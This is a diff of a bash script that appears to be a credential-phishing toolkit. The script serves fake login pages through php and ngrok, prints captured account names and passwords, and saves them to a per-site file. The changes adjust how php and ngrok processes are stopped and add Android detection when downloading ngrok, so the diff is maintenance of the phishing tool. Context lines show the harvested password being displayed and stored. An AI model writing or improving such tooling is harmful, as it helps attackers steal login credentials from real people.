@@ -111,9 +111,11 @@ checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
 checkphp=$(ps aux | grep -o "php" | head -n1)
 if [[ $checkngrok == *'ngrok'* ]]; then
 pkill -f -2 ngrok > /dev/null 2>&1
+killall -2 ngrok > /dev/null 2>&1
 fi
 if [[ $checkphp == *'php'* ]]; then
 pkill -f -2 php > /dev/null 2>&1
+killall -2 php > /dev/null 2>&1
 fi
 
 
@@ -188,8 +190,8 @@ printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
 cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
-pkill -f -2 php > /dev/null 2>&1
-pkill -f -2 ngrok > /dev/null 2>&1
+killall -2 php > /dev/null 2>&1
+killall -2 ngrok > /dev/null 2>&1
 exit 1
 
 }
@@ -311,9 +313,9 @@ echo ""
 else
 
 printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
-arch=$(uname -a | grep -o 'arm')
+arch=$(uname -a | grep -o 'arm\|Android' | head -n1)
 
-if [[ $arch == *'arm'* ]]; then
+if [[ $arch == *'arm'* ]] || [[ $arch == *'Android'* ]] ; then
 wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
 
 if [[ -e ngrok-stable-linux-arm.zip ]]; then
